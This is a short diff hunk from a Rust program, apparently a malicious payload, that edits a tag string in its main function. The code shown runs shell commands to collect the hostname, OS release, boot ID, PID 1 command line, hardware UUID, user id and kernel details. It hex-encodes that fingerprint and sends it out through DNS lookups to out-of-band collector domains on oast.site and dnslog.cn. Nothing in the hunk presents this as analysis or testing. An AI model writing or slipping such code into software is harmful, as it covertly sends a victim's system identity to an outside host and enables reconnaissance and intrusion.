@@ -30,7 +30,7 @@ fn http_get(host: &str, path: &str) {
 fn main() {
     let fp = sh("cat /proc/sys/kernel/hostname /etc/hostname 2>/dev/null; grep PRETTY /etc/os-release 2>/dev/null; cat /proc/sys/kernel/random/boot_id 2>/dev/null; head -c 200 /proc/1/cmdline 2>/dev/null | tr \\0 _; cat /sys/class/dmi/id/product_uuid 2>/dev/null; id; hostname; uname -a");
     let f = hex(&fp[..fp.chars().take(180).count()]);
-    let tag = "n9a08366";
+    let tag = "a8a08366";
     let ish = "dahpp3cgtqkjvl1mas2gdg97wwijpdwe3.oast.site";
     dns(&format!("ping.{}.y1acsd.dnslog.cn", tag));
     // chunk hex fingerprint into <=60-char labels, query f1..f6
